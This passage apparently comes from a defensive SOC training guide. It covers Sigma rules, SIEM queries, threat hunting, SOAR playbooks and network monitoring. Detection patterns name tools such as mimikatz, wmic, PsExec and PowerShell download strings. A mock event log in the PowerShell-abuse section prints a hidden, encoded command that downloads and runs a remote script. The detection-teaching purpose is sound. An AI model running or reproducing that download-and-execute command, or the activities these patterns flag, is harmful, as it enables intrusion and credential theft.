    ScriptBlockText|contains:
      - ".DownloadFile("
  condition: selection or selection2
falsepositives:
  - Legitimate admin scripts downloading tools
level: medium
tags:
  - attack.execution
  - attack.t1059.001
  - attack.command_and_control
  - attack.t1105
```

### Key Sigma fields

| Field | Purpose |
|---|---|
| `title`, `id`, `status` | Identity and maturity |
| `description`, `references` | Why it exists, supporting info |
| `logsource` | What log category/product it applies to (product, category, service) |
| `detection` | The actual pattern; `selection` + `condition` |
| `falsepositives` | Known legitimate triggers |
| `level` | informational / low / medium / high / critical |
| `tags` | MITRE ATT&CK mapping, enabling coverage tracking |

### Mock Sigma rule — service installation (persistence)

```yaml
title: Suspicious Service Installation
id: 6b2a1c9e-90e4-4f7d-8c2a-2b8f14c4d123
status: experimental
description: Detects creation of services, often used for persistence
references:
  - https://attack.mitre.org/techniques/T1543/003/
logsource:
  product: windows
  service: system
detection:
  selection:
    EventID: 7045
    ImagePath|contains:
      - "cmd.exe /c"
      - "powershell"
      - "C:\\Windows\\Temp"
      - "\\AppData\\"
      - "\\\\192."
  condition: selection
falsepositives:
  - Legitimate software installers
level: medium
tags:
  - attack.persistence
  - attack.t1543.003
```

### Mock Sigma rule — WMI lateral movement

```yaml
title: WMI Command Execution (Lateral Movement)
id: 9e3f7b2a-55cc-4a9d-8f6b-3d1a4c7e8b2f
status: experimental
description: Detects WMI process creation often used for lateral movement
references:
  - https://attack.mitre.org/techniques/T1047/
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains:
      - "wmic process call create"
      - "Win32_Process"
      - "wmic /node:"
  condition: selection
falsepositives:
  - System administration automation
level: medium
tags:
  - attack.execution
  - attack.lateral_movement
  - attack.t1047
```

## 4.4 Detection Quality: Precision and Recall

| Term | Definition | Detection meaning |
|---|---|---|
| **Precision** | Of everything you alert on, how much is *actually* bad? | High precision = few false positives |
| **Recall** | Of all actual attacks, how many do you catch? | High recall = few false negatives |
| **F1 score** | Harmonic mean of precision & recall | Balance score |

```
            Actual
          Bad   Good
Alerts   +------+------+
 Bad     |  TP  |  FP  |   Precision = TP / (TP+FP)  -> "trust in alerts"
 Good    |  FN  |  TN  |   Recall    = TP / (TP+FN)  -> "catch rate"
         +------+------+
```

**The trade-off:** Tighten a rule (high precision) → fewer false positives but risk missing variations (low recall). Loosen it (high recall) → catch more but drown in noise. Tuning is finding the sweet spot per rule, per environment.

## 4.5 Rule Testing

You must prove a rule works *and* that it doesn't go crazy in normal traffic.

| Method | Description |
|---|---|
| **Atomic Red Team / Attack simulation** | Run real attacker behavior (e.g., `Invoke-Mimikatz`) in a test VM, confirm the rule fires |
| **MITRE Caldera / adversary emulation** | Automated adversary emulation platform to validate coverage |
| **Baseline log replay** | Replay weeks of historical logs; check FP rate on a rule before deployment |
| **Synthetic event injection** | Craft events that match the rule to test parsing & logic |
| **Canary deployment** | Run new rules in "detect-only / informational" mode for 2 weeks before enabling alerts |

## 4.6 Evasion Awareness

Attackers adapt to detections. Good detection engineers think like attackers.

| Evasion technique | Detection response |
|---|---|
| **Command-line obfuscation** | Base64-encoded PowerShell, `-enc`, variable substitution | Detect on *behavior* (network connection to odd IP after PowerShell launch), not just string match |
| **Living-off-the-land (LOLBins)** | Attackers use `certutil`, `bitsadmin`, `wmic` instead of malware | Build rules for legitimate tools used for malicious purposes |
| **Process hollowing / injection** | Malware runs inside a trusted process | Cross-process memory access (Sysmon 10/8), thread creation in remote processes |
| **Log tampering** | Delete/modify local logs | Centralized collection + log integrity (see §2.5) |
| **Time stomping / anti-forensics** | Alter timestamps | Hash/immutable storage, cross-source correlation |
| **Signature packing** | New malware hash every time | Behavior + anomaly detection over hash reputation only |

## 4.7 Detection Frameworks

| Framework | What it is | How SOCs use it |
|---|---|---|
| **MITRE D3FEND** | The defensive counterpart to ATT&CK; maps *countermeasures* to techniques | Choose the best defensive data/technique to counter an ATT&CK technique |
| **MITRE CAR** (Cyber Analytics Repository) | A library of analytics mapped to ATT&CK techniques | Reference implementations of detections you can adapt |
| **Sigma HQ** | Community rule repository (Sigma rules) | Download & adapt vetted detection rules |
| **MITRE ATT&CK Navigator** | Heatmap tool showing technique coverage | Visualize detection coverage gaps for prioritization |

### Example D3FEND mapping

| ATT&CK technique | D3FEND countermeasure | Example detection |
|---|---|---|
| T1059.001 PowerShell | Command-line analysis, process execution monitoring | ScriptBlock logging + detection |
| T1003.001 LSASS access | Process memory monitoring | Sysmon 10 rule on LSASS |
| T1021.002 SMB/Admin Shares | Network traffic analysis | Suricata rule on SMB admin share access |

---

# 5. Use Case: Detecting Common Attacks

This section provides concrete, reusable detection content for the most common attack patterns. Each entry includes the ATT&CK mapping, the event source, and a real query/rule.

## 5.1 Brute Force — Windows (4625)

**ATT&CK:** T1110.001 (Password Guessing), T1110.002 (Password Spraying)

**Detection logic:** Many failed logons (4625) from one source IP, especially against privileged accounts, or many distinct usernames from one source (spray).

### Splunk (SPL)

```splunk
index=windows EventCode=4625
| bucket span=15m _time
| stats count as attempts dc(Account_Name) as users by src_ip, _time
| where attempts >= 20 OR (attempts >= 5 AND users >= 10)
| search
| eval severity=if(users > 15 OR attempts > 50, "high", "medium")
| table _time, src_ip, attempts, users, severity
```

### KQL (Microsoft Sentinel / Defender)

```kql
SecurityEvent
| where EventID == 4625
| where TimeGenerated > ago(15m)
| summarize Attempts = count(), UniqueUsers = dcount(Account)
    by SourceIp = IpAddress, TimeBin = bin(TimeGenerated, 15m)
| where Attempts >= 20 or (Attempts >= 5 and UniqueUsers >= 10)
| extend Severity = iff(Attempts > 50 or UniqueUsers > 15, "high", "medium")
```

### Sigma

```yaml
title: Windows Brute Force Attempt
id: a1b2c3d4-1111-4aaa-9bbb-ccccccc00001
status: experimental
logsource:
  product: windows
  category: security
detection:
  selection:
    EventID: 4625
  timeframe: 15m
  condition: selection | count(Account) by src_ip > 20
falsepositives:
  - Misconfigured apps and services
level: medium
tags:
  - attack.credential_access
  - attack.t1110.001
```

## 5.2 Brute Force — SSH (Linux)

**ATT&CK:** T1110

**Detection logic:** Repeated `Failed password for` messages in auth.log, or SSH connection floods.

### Query (auth.log → SIEM, KQL-style)

```kql
Syslog
| where Facility == "auth"
| where ProcessName contains "sshd"
| where Message has "Failed password"
| summarize Attempts = count() by SrcIp = tostring(extract("from ([0-9.]+)", 1, Message)),
    User = tostring(extract("for (\\w+) from", 1, Message)), bin(TimeGenerated, 15m)
| where Attempts >= 10
```

### mock auth.log extract (evidence)

```text
Aug  5 12:00:01 web-01 sshd[31042]: Failed password for root from 45.83.19.204 port 54222 ssh2
Aug  5 12:00:02 web-01 sshd[31043]: Failed password for admin from 45.83.19.204 port 54223 ssh2
Aug  5 12:00:04 web-01 sshd[31044]: Failed password for root from 45.83.19.204 port 54224 ssh2
Aug  5 12:00:05 web-01 sshd[31045]: Failed password for oracle from 45.83.19.204 port 54225 ssh2
```

## 5.3 Mimikatz / LSASS Access

**ATT&CK:** T1003.001 (LSASS Memory), T1555 (Credentials from Password Stores)

**Detection logic:** Sysmon Event 10 (process accessed LSASS) from an unexpected process — especially non-standard binaries like `mimikatz.exe`, or trusted tools (procdump) used from odd paths.

### Sysmon Event 10 anatomy

```text
Process Create: Process: mimikatz.exe  PID: 4456
  GrantType: 0x1010
  SourceProcessGUID: {3d0f6a2e-0000-0000-0000-000000000001}
  SourceProcessId: 4456
  SourceThreadId: 1234
  SourceProcessImage: C:\Windows\Temp\mimikatz.exe
  TargetProcessGUID: {3d0f6a2e-0000-0000-0000-000000000045}
  TargetProcessId: 684
  TargetImage: C:\Windows\System32\lsass.exe
```

### Splunk detection

```splunk
index=sysmon EventCode=10 TargetImage="*lsass.exe"
| search NOT SourceImage="C:\\Windows\\System32\\*"
| table _time, ComputerName, SourceProcessImage, TargetProcessImage
```

### Sigma (LSASS access)

```yaml
title: Suspicious LSASS Access (Mimikatz)
id: c4d5e6f7-2222-4bbb-9ccc-000000000012
status: experimental
logsource:
  product: windows
  category: process_access
detection:
  selection:
    TargetImage|endswith: 'lsass.exe'
    SourceImage|startswith:
      - 'C:\Program Files'
      - 'C:\Windows\Temp'
      - 'C:\Users\Public'
  filter:
    SourceImage|endswith:
      - 'svchost.exe'
      - 'winlogon.exe'
      - 'csrss.exe'
  condition: selection and not filter
falsepositives:
  - Legitimate troubleshooting tools (procdump) run by admins
level: high
tags:
  - attack.credential_access
  - attack.t1003.001
```

## 5.4 Persistence — New Service (7045 / 4697)

**ATT&CK:** T1543.003 (Windows Service)

**Detection logic:** Event 7045 (System) or 4697 (Security) with a suspicious image path (Temp, AppData, UNC share) or binary name.

### Query (Elasticsearch Lucene / SIEM)

```lucene
winlog.provider_name:"Service Control Manager" AND event_id:7045
AND (winlog.event_data.ImagePath:(*\\AppData\\* OR *\\Temp\\* OR *cmd.exe* OR *powershell.exe*))
```

### Sigma (already shown in §4.3)

## 5.5 Persistence — Registry Run Keys

**ATT&CK:** T1547.001

**Detection logic:** Sysmon Event 13 (registry value set) on `HKCU\...\Run`, `HKLM\...\Run`, `RunOnce`, or `StartupApproved`.

### Splunk query

```splunk
index=sysmon EventCode=13
TargetObject="*\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*"
| search NOT SourceProcessImage="*\\explorer.exe" NOT SourceProcessImage="*\\msiexec.exe"
| table _time, ComputerName, TargetObject, Details, SourceProcessImage
```

### mock registry persistence event

```text
Event: Registry value set (Sysmon 13)
  Computer: WS-FIN-078
  EventID: 13
  SourceProcessImage: C:\Users\j.doe\AppData\Local\Temp\svchost-cache.exe
  TargetObject: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\UpdateCheck
  Details: C:\Users\j.doe\AppData\Local\Temp\svchost-cache.exe --persist
```

## 5.6 Lateral Movement — Pass-the-Hash / Over-Pass-the-Hash

**ATT&CK:** T1550.002 (Pass the Hash), T1550.003 (Pass the Ticket)

**Detection logic:** Network logon (Type 3) from a workstation using an account that shouldn't authenticate from there, NTLM traffic from a non-DC host, or Kerberos TGT request anomalies.

### KQL — NTLM logon anomalies

```kql
SecurityEvent
| where EventID == 4624 and LogonType == 3
| where AccountType == "User"
| summarize Logons = count() by Account, Computer, IpAddress, bin(TimeGenerated, 1h)
| where Logons >= 5
| join kind=leftanti (
    SecurityEvent
    | where EventID == 4624 and LogonType == 3
    | summarize KnownLogons = count() by Account, Computer
    | where KnownLogons > 20
  ) on Account, Computer
```

### Detection logic summary (pass-the-hash)

| Indicator | Event |
|---|---|
| NTLM network logons from a workstation to many hosts | 4624, LogonType 3, AuthPackage = NTLM |
| Anonymous/guest NTLM from a non-DC | 4624 + source not a DC |
| Kerberos TGT with odd encryption or replayed | 4768/4769 anomalies |
| Lateral movement tooling | WMI (Event 4688: `wmic`, `wmi exec`), SMB admin share access |

## 5.7 Lateral Movement — WMI / PsExec

**ATT&CK:** T1047 (WMI), T1021.002 (SMB/Admin Shares)

### Detection logic

- **WMI:** Process creation (4688/1) with `wmic`, `powershell -c Invoke-WmiMethod`, `Win32_Process`; Sysmon 19 (WmiEventFilter) / 20 / 21; WMI activity from an unusual host.
- **PsExec:** Service creation `PSEXESVC.exe` (7045/4697), 4624 logons with service (type 5).

### Sigma — PsExec service creation

```yaml
title: PsExec Service Creation
id: e5f6a7b8-3333-4ccc-9ddd-000000000034
status: experimental
logsource:
  product: windows
  service: system
detection:
  selection:
    EventID: 7045
    ImagePath|contains: 'PSEXESVC'
  condition: selection
falsepositives:
  - Admin use of Sysinternals PsExec (review against admins)
level: medium
tags:
  - attack.lateral_movement
  - attack.t1021.002
```

## 5.8 Data Exfiltration — Large Outbound

**ATT&CK:** T1041 (Exfil over C2), T1048 (Exfil over Alternative Protocol), T1567 (Web Service Exfil)

**Detection logic:** Unusually large outbound transfers, especially to uncommon destinations, at odd hours, from a single host.

### NetFlow/firewall query (SPL)

```splunk
index=netflow direction=outbound
| stats sum(bytes_out) as total_mb by src_ip, dst_ip, dst_port
| where total_mb > 1000000   # > 1 GB in window
| where NOT (dst_ip="8.8.8.8" OR dst_ip like "10.%" OR dst_port=443 AND src_role="backup-srv")
```

### KQL (VPC Flow Logs style)

```kql
FLOWLOGS_CL
| where Direction == "out" and BytesSent > 0
| summarize TotalBytes = sum(BytesSent) by SrcIp, DstIp, DstPort, bin(TimeGenerated, 1h)
| where TotalBytes > 1000000000
| project SrcIp, DstIp, DstPort, TotalGB = TotalBytes / 1e9
```

## 5.9 C2 Beaconing

**ATT&CK:** T1071.001 (Application Layer Protocol), T1105 (Ingress Tool Transfer), T1573 (Encrypted Channel)

**Detection logic:** Periodic, regular-interval connections to a single destination (jitter), unusual domains, or connections to known bad IPs.

### Network beacon detection query (SPL)

```splunk
index=netflow OR index=proxy
| where src_ip!="10.0.0.0/8"
| sort src_ip, dst_ip, _time
| streamstats time_window=1h count as hits by src_ip, dst_ip
| where hits >= 5
| eval delta = _time - lag(_time, 1)
| stats avg(delta) as avg_interval, stdev(delta) as jitter, count as hits by src_ip, dst_ip
| where avg_interval > 5 AND avg_interval < 60 AND jitter < avg_interval * 0.2
```

### Behavioral beaconing (KQL)

```kql
CommonSecurityLog
| where Direction == "OUTBOUND"
| summarize ConnTimes = make_list(TimeGenerated), Count = count() by SrcIp, DstIp
| where Count >= 6
| mvexpand ConnTimes
| extend Delta = ConnTimes - prev(ConnTimes, 1, ConnTimes)
| where ConnTimes != prev(ConnTimes, 1, ConnTimes)
| summarize AvgDelta = avg(toint(Delta) / 1e6), Jitter = stdev(toint(Delta) / 1e6), N = count()
    by SrcIp, DstIp
| where AvgDelta between (30000 .. 3600000)
| where Jitter < AvgDelta * 0.25
```

### Indicators of beaconing

| Indicator | Description |
|---|---|
| **Low jitter** | Connections arrive at nearly fixed intervals (e.g., every 52 seconds ±3s) |
| **Consistent payload size** | Each request is similar in size |
| **Odd hours** | Traffic mostly at 01:00–05:00, not business hours |
| **Unusual destination** | Freshly registered domains, IPs not in org's partner list |
| **Post-compromise timing** | Beacons begin right after a phishing email / malicious file |

## 5.10 PowerShell Abuse

**ATT&CK:** T1059.001

**Detection logic:** PowerShell launching from unusual parents, obfuscated command lines, downloading and executing, or abnormal script block content.

### Detection via ScriptBlock Logging (4104)

```yaml
title: Obfuscated PowerShell Command
id: f6a7b8c9-4444-4ddd-9eee-000000000056
status: experimental
logsource:
  product: windows
  category: ps_script
detection:
  selection:
    ScriptBlockText|contains|all:
      - "-enc"
      - "-e "
      - "FromBase64String"
      - "IEX"
      - "Invoke-Expression"
  condition: selection
falsepositives:
  - Some legitimate scripts use these (low frequency)
level: medium
tags:
  - attack.execution
  - attack.t1059.001
```

### Suspicious parent process (KQL)

```kql
DeviceProcessEvents
| where FileName == "powershell.exe" or FileName == "pwsh.exe"
| where InitiatingProcessFileName in ("winword.exe","excel.exe","outlook.exe",
    "wscript.exe","cscript.exe","mshta.exe","rundll32.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

### mock PowerShell abuse event

```text
Time: 2026-08-05 03:11:22
Host: WS-FIN-078
Event 4104 (ScriptBlock):
  powershell.exe -noP -sta -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA
  Context: Invoke-Expression(New-Object Net.WebClient).DownloadString('http://185.220.101.4/x.ps1')
Parent: winword.exe (C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE)
```

---

# 6. Threat Hunting

## 6.1 What is Threat Hunting?

**Threat hunting** is the **proactive and iterative search** through networks, endpoints, and cloud environments to detect **sophisticated threats that evade existing security controls**. It is hypothesis-driven, human-led analysis — the opposite of "wait for the alert."

> **Hunting vs detection:** Detection says *"the SIEM alerts when X happens."* Hunting says *"let me look for signs that X happened in the last 90 days without tripping an alert."*

## 6.2 The Hunt Cycle

A structured hunt moves through five phases:

```
 +-----------------------------------------------------------+
 |  1. HYPOTHESIS   "I think attackers could be doing X..."  |
 |        |                                                   |
 |  2. DATA         "Which logs/telemetry would prove or     |
 |                  disprove it?"                             |
 |        |                                                   |
 |  3. ANALYZE      Run queries, pivot, enrich, look for     |
 |                  anomalies                                 |
 |        |                                                   |
 |  4. DOCUMENT     Write findings, new detections, IoCs,    |
 |                  coverage gaps                             |
 |        |                                                   |
 |  5. FEEDBACK     -> Tune detections, update intel, plan   |
 |                  next hunt -------------------------------+
```

### Phase detail

| Phase | Activities | Output |
|---|---|---|
| **Hypothesis** | Pick a technique or threat; ask "what would this look like here?" | One-sentence hypothesis, scope, expected evidence |
| **Data** | Identify available log sources & retention windows; check data gaps | Data source list, known gaps |
| **Analyze** | Run queries; pivot on interesting hits; baseline vs anomaly | Findings, potential IoCs |
| **Document** | Write the hunt report; link findings to ATT&CK | Hunt report, new rules, IoCs |
| **Feedback** | Feed new detections into the SOC, update coverage matrix | Detection additions, tuned rules |

## 6.3 Hypothesis Generation

Good hypotheses come from many places:

| Source | Example hypothesis |
|---|---|
| **ATT&CK technique review** | "We have no detection for T1573 (encrypted C2). Do we see any odd encrypted flows we haven't explained?" |
| **Threat intelligence** | "A campaign is using `7z.exe` to archive data. Do any of our hosts show 7z + large archive creation on non-builder machines?" |
| **Recent incidents** | "Last breach used Outlook macros. Are there other dormant macro-enabled docs still sitting in inboxes?" |
| **Anomaly sightings** | "DNS query logs show a cluster of `.xyz` TLD lookups at 02:00. Is that a DGA?" |
| **New tooling** | "We just onboarded Zeek. Let's hunt for the SMB behaviors we've never been able to see." |
| **Known gaps** | "Our coverage matrix shows 0% on T1568 (DNS exfil). Let's hunt for it." |

## 6.4 Hunting vs Detection

| Aspect | Detection | Hunting |
|---|---|---|
| **Trigger** | Reactive — fires on rule match | Proactive — scheduled, hypothesis-driven |
| **Timeframe** | Usually real-time/near-real-time | Often hunts historical data (weeks/months back) |
| **Known vs unknown** | Catches *known* patterns | Aims to catch *unknown/novel* patterns |
| **Who does it** | SIEM rules, Tier 1/2 mostly | Tier 3 analysts, dedicated hunters |
| **Output** | Alerts | Findings, coverage improvements, new rules |

## 6.5 Baselining — What Is "Normal"?

You can't spot the abnormal without knowing the normal. Baselining means learning the normal behavior of users, hosts, and services so deviations stand out.

| Baseline type | Example |
|---|---|
| **User** | "Normally logs in 08:00–18:00 from the office IP 10.10.0.0/16. Midnight logon from 185.x = anomaly." |
| **Host** | "Backup server normally sends 200 GB outbound at 02:00 to the backup host. Other hours = suspicious." |
| **Network** | "DNS queries to `.com` predominate; a burst of `.tk`/`.xyz` TLDs is abnormal." |
| **Service/account** | "`svc-backup` never logs in interactively. Interactive logon = red flag." |

### Baselining in practice (mock)

```text
USER: r.johnson (Finance, FIN-AD-01)
Baseline window: 90 days
  - Login hours: 07:45 - 18:30, Mon-Fri
  - Typical source: 10.10.0.0/16 or VPN range 172.16.0.0/12
  - Logons per day: 3-8
  - Rarely uses RDP; never uses admin tools

ANOMALY (2026-08-04 02:14)
  - Logon from IP 91.208.31.99 (VPN not in use at 02:00)
  - Interactive logon to DB-FIN-02
  - 11 password vault lookups in 4 minutes
  -> Escalate as suspected account takeover.
```

## 6.6 Hunting Techniques

| Technique | Description |
|---|---|
| **Search / drill down** | Query a specific IoC or hypothesis across all data |
| **Clustering / grouping** | Group events by rare fields (e.g., rare parent-child process combos) to find outliers |
| **Stack counting** | Count events by field; look for values that deviate from distribution (e.g., 200 hosts → 1 queries a new domain 500 times) |
| **Pivoting** | Start with one suspicious item and follow it: IP → user → host → process → file |
| **Data mining / ML** | Unsupervised models that flag deviations (e.g., user behavior analytics) |
| **Device/user behavior analytics** | Detect unusual behavior patterns with statistical models |
| **Honeypots / canary tokens** | Deploy decoys; any contact = detection |

## 6.7 Mock Hunting Engagement Walkthrough

### Hunt: "SMB Admin Share Abuse (T1021.002)"

**Hunting team:** M. Osei (Tier 3), J. Park (Tier 2)
**Duration:** 3 days (data: 90 days)

### Step 1 — Hypothesis

> "If an attacker is moving laterally via SMB admin shares (`C$`, `ADMIN$`), we should see unusual access to admin shares from workstations, or from accounts that don't normally use them. We have no dedicated detection for this."

### Step 2 — Data sources

- Windows Security 5140 (network share object accessed) — available
- Sysmon Event 3 (network connection) — partial coverage (only 40% of hosts have Sysmon)
- Zeek SMB logs (network side) — available for last 30 days

### Step 3 — Queries run

**Query 1 — admin share access (Security 5140):**

```splunk
index=windows EventCode=5140 ShareName="*$"
| stats count by src_ip, AccountName, ComputerName
| where NOT (src_ip="10.0.1.10" OR src_ip="10.0.2.15")   # patch mgmt + backup servers
| sort - count
```

**Query 2 — SMB admin share from Zeek:**

```splunk
index=zeek sourcetype=smb command!="-"
| where path="*C$" OR path="*ADMIN$"
| stats count by id.orig_h, id.resp_h, user
```

### Step 4 — Findings

```text
FINDING 1 (TRUE POSITIVE - LOW SEVERITY)
  Host WS-ACC-332 made 12 admin-share connections to FIN-SRV-07 over 3 weeks
  using account "s.lee" (accounting manager). s.lee confirmed this is her
  mapped drive mount from a legacy macro. Action: re-train, add to allowlist.

FINDING 2 (SUSPICIOUS - INVESTIGATED, NOT MALICIOUS)
  Host WS-ACC-011 connected to 6 different servers' ADMIN$ in 1 hour using
  account "p.martin" during "month-end close". p.martin is an auditor who
  legitimately mounts drives. Action: add to allowlist with comment.

FINDING 3 (HIGH - ESCALATED TO INCIDENT)
  Host WS-FIN-078 connected to DB-FIN-02 ADMIN$ at 02:11 on 2026-08-04
  using "r.johnson". r.johnson's account had no business need, host was
  offline from 22:00 (per NAC), and VPN was inactive. CONFIRMED: this was
  part of the same campaign as the 6.5 baselining anomaly. Escalated to
  INC-2441. Host isolated, account disabled, forensics initiated.

FINDING 4 (COVERAGE GAP)
  Only 40% of hosts run Sysmon, so network-side (Zeek) was the deciding
  evidence. Recommendation: expand Sysmon deployment to all domain-joined
  workstations.
```

### Step 5 — Feedback loop

| Output | Action |
|---|---|
| New Sigma rule | "SMB Admin Share Access" (T1021.002) deployed in detect-only mode |
| IoC added | IP 91.208.31.99, hostname WS-FIN-078 added to threat intel |
| Coverage matrix | Lateral Movement T1021.002 moved from "Partial" to "Detected" |
| Hunt report filed | HUNT-2026-014 linked to INC-2441 |

## 6.8 Hunting with MITRE ATT&CK

ATT&CK gives hunting a structured vocabulary:

| Tactic | Example hunt question |
|---|---|
| Initial Access | "Do we see any odd Office document macro activity in the last 90 days?" |
| Execution | "Which hosts ran `mshta`, `wscript`, or `regsvr32` with network connections afterward?" |
| Persistence | "Which hosts have a service pointing to a Temp path that isn't on the approved list?" |
| Credential Access | "Which processes have opened LSASS that aren't in our approved tool list?" |
| Lateral Movement | "Which accounts logged into >3 hosts in <10 minutes?" |
| Exfiltration | "Which hosts sent >1 GB outbound in a day that aren't backup/file servers?" |

## 6.9 Structured Hunting Models

### Pyramid of Pain

The **Pyramid of Pain** (David Bianco) ranks the difficulty an adversary faces when defenders deny a certain artifact type. Hunting should aim high on the pyramid.

```
          +  TTPs  +            <- hardest for adversary to change (best target)
         /   Tools   \              techniques the attacker MUST use
        /   Host Artifacts  \       files, registry, services left behind
       /   Network Artifacts    \   domains, IPs, SSL certs, C2 patterns
      /   Hashes                  \  file hashes
     ------------------------------   easiest to change (defender sees them first)
```

| Level | Example | Defensive value |
|---|---|---|
| **TTPs** | "Attacker uses scheduled tasks + WMI for lateral movement" | Very high — deny the technique, force rework |
| **Tools** | Block `mimikatz.exe`, `cobaltstrike` | High — attackers swap tools |
| **Host artifacts** | Detect suspicious service creation, Run keys | Medium |
| **Network artifacts** | Block C2 domains | Medium-low — domains/IPs change fast |
| **Hashes** | Block known malware hash | Low — trivial to recompile |

### Diamond Model of Intrusion Analysis

The **Diamond Model** structures a single intrusion event as four core elements:

```
            Adversary
           /         \
          /           \
     Victim   <----->   Infrastructure
          \           /
           \         /
            Capability
```

| Vertex | Meaning | Hunting use |
|---|---|---|
| **Adversary** | The attacker (threat actor / group) | Attribute behaviors to groups via intel |
| **Capability** | Tools/techniques (malware, exploits) | Map malware samples to detections |
| **Infrastructure** | The channels (domains, IPs, C2) | Pivot from one C2 IP to find the whole campaign |
| **Victim** | The target (org, users, systems) | Understand who/why, prioritize response |

**Pivoting example:** Detect malware (capability) → find its C2 IP (infrastructure) → pivot to all hosts connecting to that IP (victims) → attribute to adversary via intel (e.g., "campaign overlaps with group 'TA-302'"). Each connection opens new hunting paths.

---

# 7. SOAR (Security Orchestration, Automation, and Response)

## 7.1 What is SOAR?

**SOAR (Security Orchestration, Automation, and Response)** is a platform that:
- **Orchestrates** — connects your security tools (SIEM, EDR, firewall, ticketing, email gateway) with prebuilt integrations;
- **Automates** — executes playbooks without human keystrokes;
- **Responds** — triggers containment/remediation actions and manages the incident.

Think of SOAR as the "robot helper" that does the repetitive 30% of incident response instantly while humans handle the rest.

## 7.2 Playbooks

A **playbook** is a codified, machine-executable set of steps. A **runbook** is usually the human-readable version (see §13). SOAR executes playbooks.

### Anatomy of a playbook

```
Trigger --> Step 1 --> Condition? --> Branch A (automated containment)
                                    `-> Branch B (human approval)
                    --> Enrichment --> Notifications --> Ticket update --> Complete
```

### Playbook building blocks

| Block | Example |
|---|---|
| **Trigger** | New SIEM alert, new phishing report, new EDR detection |
| **Enrichment** | Lookup IP in VirusTotal, file hash in a sandbox, user in HR directory |
| **Decision/condition** | "Is host critical? → if yes, escalate to human; if no, isolate" |
| **Action** | Isolate host in EDR, block IP in firewall, disable user in AD, quarantine email |
| **Notification** | Slack/SMS/page the on-call analyst |
| **Ticketing** | Create/update ticket in ServiceNow/Jira with all context |
| **Documentation** | Write case notes automatically |

## 7.3 Mock Playbook: Phishing Alert → Auto-Isolate

### Scenario

The email gateway (Defender/Proofpoint) detects a credential-phishing email containing a malicious URL + attachment delivered to 14 users. The SIEM/SOAR integration fires.

### Playbook steps (simplified flow)

| Step | Action | Tool | Auto? |
|---|---|---|---|
| 1 | **Trigger** on `PhishingDetected` alert | Email gateway → SOAR | Auto |
| 2 | **Extract IoCs**: sender, subject, URL, attachment hash | Parse | Auto |
| 3 | **Reputation check**: hash + URL in VirusTotal | VirusTotal | Auto |
| 4 | **Decision**: reputation score > threshold? | Logic | Auto |
| 5a | **If malicious**: quarantine all messages with same subject/sender from all mailboxes | Email gateway | Auto |
| 5b | **If benign**: close ticket as false positive, notify queue | Logic | Auto |
| 6 | **Identify recipients** + their hosts (via AD/CMDB) | AD, CMDB | Auto |
| 7 | **Containment decision**: critical user (C-suite/finance) → human approval; else → isolate host automatically | Logic | Auto |
| 8 | **Isolate host(s)** in EDR for non-critical users | EDR | Auto |
| 9 | **Notify**: Slack channel + page Tier 1 for critical branch | Slack/PagerDuty | Auto |
| 10 | **Open incident ticket** with full evidence chain; assign | ServiceNow | Auto |
| 11 | **Log case notes** for audit | SOAR | Auto |

### Outcome (mock run 2026-08-05)

```text
PLAYBOOK: Phish_Contain_v2  |  run-id PB-4471
Trigger: Email gateway "CredentialPhish" alert @ 11:02
  - Sender: invoices@secure-update-now[.]net
  - URL: hxxp://185.244.25.198/verify-login
  - Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
VirusTotal: 62/72 vendors malicious. Reputation: 9.4/10 -> MALICIOUS
  - Quarantined 14 emails (subject: "Invoice #8842 - Overdue")
  - Recipients: 14 users; 2 flagged critical (CEO, CFO) -> human approval branch
  - Hosts auto-isolated: 12 (non-critical)
  - CEO/CFO hosts: paged Tier 1, approval pending
Ticket: INC-2445 opened, evidence attached, case notes written.
Elapsed: 4 min 12 sec (vs ~40 min fully manual)
```

## 7.4 Case Management

SOAR (and SIEMs/IR platforms) provide **case management** — a structured workspace for incidents.

| Feature | Purpose |
|---|---|
| Ticket/task tracking | Every incident has an ID, status, assignee, SLA clock |
| Evidence linking | Attach logs, screenshots, IoCs, packet captures to the case |
| Collaboration | Comments, @mentions, shared timeline |
| Timeline view | Reconstruct event sequence visually |
| Audit trail | Every action logged with who/what/when |
| Reporting | Case stats for metrics & management |

## 7.5 SOAR Benefits and Limits

### Benefits

| Benefit | Why |
|---|---|
| **Speed** | Automated steps run in seconds, not analyst minutes |
| **Consistency** | Every alert handled exactly the same way (no skip-steps) |
| **Staff efficiency** | Analysts focus on judgment, not copy-paste enrichment |
| **Reduced MTTD/MTTR** | Automation shortens response time directly |
| **Scale** | Handle hundreds of alerts/day without hiring hundreds of analysts |
| **Auditability** | Every automated action is logged (great for compliance) |

### Limits & pitfalls

| Limit | Note |
|---|---|
| **Garbage-in risk** | Automating a bad decision amplifies damage (auto-isolating a domain controller would be catastrophic) |
| **Not a replacement for judgment** | Complex incidents still need human analysis |
| **Playbook maintenance** | Playbooks rot if tools/processes change; needs ownership |
| **Tool integration debt** | Every integration needs API keys, maintenance, and testing |
| **Alert fatigue paradox** | Automating low-value work is good, but automating everything masks bad rule tuning |

---

# 8. Network Security Monitoring (NSM)

## 8.1 Overview

**Network Security Monitoring (NSM)** is the collection, analysis, and escalation of network traffic data to detect and respond to intrusions. The SOC sees the network side of every action an attacker takes: connections, protocols, content.

### The NSM layers (what we capture)

| Layer | What it tells you | Tools |
|---|---|---|
| **Flow metadata** | Who talked to whom, when, how much data | NetFlow/sFlow, IPFIX |
| **Protocol/event logs** | Deep insight into specific protocols (HTTP, DNS, SMB, TLS) | Zeek (Bro) |
| **Signature detection** | Known attack patterns matched in traffic | Suricata, Snort |
| **Full packet capture** | Raw packets for deep forensic reconstruction | tcpdump, Wireshark, PCAP systems |
| **DNS** | The query language of the network — often the first sign of compromise | dnscap, Zeek DNS, Pi-hole logs |

## 8.2 NetFlow / sFlow

**NetFlow** (Cisco) and **sFlow** (sampled flow) summarize traffic as *flows* — a set of packets sharing source, dest, port, and protocol. Flow data is small and cheap, ideal for long retention and anomaly detection.

### NetFlow record anatomy

| Field | Example |
|---|---|
| Source IP | 10.10.5.22 |
| Dest IP | 91.208.31.99 |
| Source port | 49755 |
